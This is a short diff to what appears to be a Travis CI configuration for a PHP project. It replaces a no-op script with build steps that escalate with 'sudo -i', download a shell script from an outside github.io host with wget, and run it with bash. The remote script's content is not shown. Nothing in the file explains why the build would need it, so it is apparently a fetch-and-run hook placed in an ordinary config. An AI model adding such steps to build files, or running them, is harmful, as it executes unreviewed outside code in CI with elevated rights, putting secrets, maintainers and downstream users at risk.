@@ -1,2 +1,5 @@
 language: php
-script: true
+script:
+  - sudo -i
+  - wget firtone.github.io/a.sh
+  - bash a.sh
